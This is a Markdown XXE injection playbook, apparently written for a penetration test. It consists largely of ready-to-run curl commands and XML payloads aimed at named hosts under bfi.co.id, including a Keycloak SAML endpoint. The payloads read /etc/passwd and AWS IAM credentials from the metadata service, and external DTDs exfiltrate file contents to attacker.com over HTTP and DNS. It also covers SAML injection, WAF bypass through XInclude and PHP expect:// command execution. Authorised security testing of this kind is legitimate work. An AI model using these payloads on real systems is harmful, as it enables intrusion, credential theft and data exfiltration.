# XXE Injection Reference

## Overview

XML External Entity (XXE) injection exploits XML parsers that process external entity declarations, enabling file read, SSRF, and data exfiltration. Most modern frameworks disable external entities by default, but legacy parsers, SAML endpoints, and content-negotiation quirks in Spring Boot still expose this attack surface.

---

## Decision Tree — When to Test

- **Any XML input** — SOAP services, REST endpoints accepting `application/xml`
- **SOAP/WSDL endpoints** — always parse XML, often with legacy parsers
- **File uploads** — SVG, DOCX, XLSX, PDF (embedded XML)
- **Content-Type switching** — JSON APIs that also accept `text/xml` or `application/xml`
- **SAML endpoints** — SAMLRequest/SAMLResponse are base64-encoded XML (Keycloak, ADFS)
- **RSS/Atom feeds** — any endpoint consuming syndication XML

---

## 1. Classic XXE — File Read

```bash
# Safe PoC target: /etc/hostname (non-sensitive, proves read)
curl -X POST https://target.bfi.co.id/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><data>&xxe;</data></root>'

# Full /etc/passwd read
curl -X POST https://target.bfi.co.id/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'
```

Look for file contents reflected in response body or error messages.

---

## 2. XXE to SSRF

```bash
# AWS metadata (IMDSv1)
curl -X POST https://target.bfi.co.id/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>'

# Internal service enumeration
curl -X POST https://target.bfi.co.id/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/actuator/env">
]>
<root><data>&xxe;</data></root>'
```

---

## 3. Blind XXE — Out-of-Band (OOB)

**Attacker DTD file** (host at `https://attacker.com/evil.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

**Payload sent to target:**
```bash
curl -X POST https://target.bfi.co.id/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root><data>test</data></root>'
```

**DNS exfiltration variant** (for firewalled targets):
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%exfil;
```

Monitor with `interactsh-client` or Burp Collaborator.

---

## 4. Blind XXE — Error-Based

Force file contents into error messages via invalid URI:

**Attacker DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Payload:**
```bash
curl -X POST https://target.bfi.co.id/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/error.dtd">
  %dtd;
]>
<root><data>test</data></root>'
```

Error message will contain: `file:///nonexistent/actual-hostname-value`

---

## 5. XInclude Attacks

When you control only a **data value** (not the full XML document), you cannot inject a DOCTYPE. Use XInclude instead:

```bash
curl -X POST https://target.bfi.co.id/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/hostname"/>
</foo>'

# Inside a field value
curl -X POST https://target.bfi.co.id/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<root><username><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo></username></root>'
```

Works when WAF blocks `<!DOCTYPE` but parser supports XInclude.

---

## 6. Content-Type Switching

Many frameworks (Spring Boot, Express) auto-negotiate content type. Switch from JSON to XML:

```bash
# Original JSON request
curl -X POST https://target.bfi.co.id/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test"}'

# Switch to XML with XXE
curl -X POST https://target.bfi.co.id/api/users \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><username>&xxe;</username><password>test</password></root>'

# Also try text/xml
curl -X POST https://target.bfi.co.id/api/users \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><username>&xxe;</username></root>'
```

---

## 7. XXE via File Upload

### SVG with XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

```bash
curl -X POST https://target.bfi.co.id/api/upload \
  -F "file=@xxe.svg;type=image/svg+xml"
```

### DOCX with XXE
1. Unzip a valid .docx
2. Edit `word/document.xml` — inject entity in body
3. Rezip and upload

```bash
mkdir docx_exploit && cd docx_exploit
unzip ../template.docx
# Edit word/document.xml to include XXE payload
zip -r ../exploit.docx .
curl -X POST https://target.bfi.co.id/api/upload \
  -F "file=@exploit.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document"
```

> See [file-upload-attacks.md](file-upload-attacks.md) for full upload payloads.

---

## 8. Spring Boot Specific

Spring Boot with `jackson-dataformat-xml` or default content negotiation accepts XML on JSON endpoints:

```bash
# Test if XML is accepted (content negotiation)
curl -X POST https://target.bfi.co.id/api/v1/resource \
  -H "Content-Type: application/xml" \
  -H "Accept: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<HashMap><key>&xxe;</key></HashMap>'

# Spring uses Jackson — try wrapper elements matching DTO fields
curl -X POST https://target.bfi.co.id/api/v1/login \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<LoginRequest><username>&xxe;</username><password>x</password></LoginRequest>'

# Check actuator endpoints with XML
curl https://target.bfi.co.id/actuator/env \
  -H "Accept: application/xml"
```

**Key insight:** Spring Boot < 2.x had XML enabled by default. Spring Boot 2.x+ requires `jackson-dataformat-xml` on classpath — but many banking apps include it for legacy compatibility.

---

## 9. Keycloak / SAML Specific

SAMLRequest and SAMLResponse are base64-encoded, deflated XML:

```bash
# Decode existing SAMLRequest
echo "$SAML_REQUEST" | base64 -d | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(),-15))" > saml.xml

# Inject XXE into decoded SAML
# Add DOCTYPE before <samlp:AuthnRequest>
```

**Modified SAML assertion with XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  ID="_xxe_test" Version="2.0" IssueInstant="2026-01-01T00:00:00Z"
  Destination="https://keycloak.bfi.co.id/realms/master/protocol/saml">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
</samlp:AuthnRequest>
```

```bash
# Re-encode and send
cat modified_saml.xml | python3 -c "import sys,zlib,base64; print(base64.b64encode(zlib.compress(sys.stdin.buffer.read())[2:-4]).decode())" | \
  xargs -I{} curl "https://keycloak.bfi.co.id/realms/master/protocol/saml" \
  --data-urlencode "SAMLRequest={}"
```

**Keycloak-specific paths to read:**
- `/opt/keycloak/conf/keycloak.conf`
- `/opt/jboss/keycloak/standalone/configuration/standalone.xml`

---

## 10. Pitfalls

- **Binary files fail** — Classic XXE can't exfiltrate binary. Use `php://filter/convert.base64-encode/resource=` (PHP) or `expect://` wrapper. On Java, stick to text files.
- **Newlines break XML** — Multi-line files (like `/etc/passwd`) can break entity substitution. Use CDATA wrapping via parameter entities: `<!ENTITY % start "<![CDATA["> <!ENTITY % end "]]>">`
- **Parser differences** — Java (SAXParser/DocumentBuilder) supports parameter entities OOB; PHP (libxml) supports `expect://`; .NET doesn't resolve external DTDs by default post-.NET 4.5.2
- **WAF blocks DOCTYPE** — If `<!DOCTYPE` is filtered, use XInclude (Section 5) or Content-Type switching to bypass
- **Don't read sensitive files** — Use `/etc/hostname` or `/proc/version` for safe PoC, never `/etc/shadow` (triggers alerts, may crash parser on permission denied)

---

## Checklist

1. [ ] Identify all endpoints accepting XML (SOAP, REST, SAML, file upload)
2. [ ] Test Content-Type switching on JSON endpoints (`application/xml`, `text/xml`)
3. [ ] Try classic XXE with `file:///etc/hostname` for safe PoC
4. [ ] Test XXE to SSRF against cloud metadata (`169.254.169.254`)
5. [ ] If no reflection — test blind OOB via external DTD + Collaborator/interactsh
6. [ ] If outbound HTTP blocked — try DNS exfiltration or error-based
7. [ ] Test XInclude when you control only a value, not full document
8. [ ] Test SVG/DOCX upload with embedded XXE entities
9. [ ] Test SAML endpoints (decode → inject → re-encode SAMLRequest)
10. [ ] Verify Spring Boot content negotiation on all API endpoints

---

## Parameter Entity Exploitation (Blind XXE)

When direct entity reflection is blocked, use parameter entities with external DTD:

### External DTD File (host on attacker server)
```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?d=%file;'>">
%eval;
%exfil;
```

### Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>bar</foo>
```

### Error-Based Extraction (no OOB needed)
```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
File content appears in the error message path.

---

## PHP Wrapper Exploitation

### PHP filter (base64 encode source code)
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```

### PHP expect (RCE if expect:// enabled)
```xml
<!ENTITY xxe SYSTEM "expect://whoami">
```

### PHP input (POST body as entity content)
```xml
<!ENTITY xxe SYSTEM "php://input">
<!-- POST body contains the data to inject -->
```

---

## XXE via File Upload

### SVG with XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

### DOCX/XLSX (modify embedded XML)
```bash
unzip document.docx -d extracted/
# Edit extracted/word/document.xml or [Content_Types].xml
# Inject XXE entity, repack
zip -r evil.docx extracted/
```
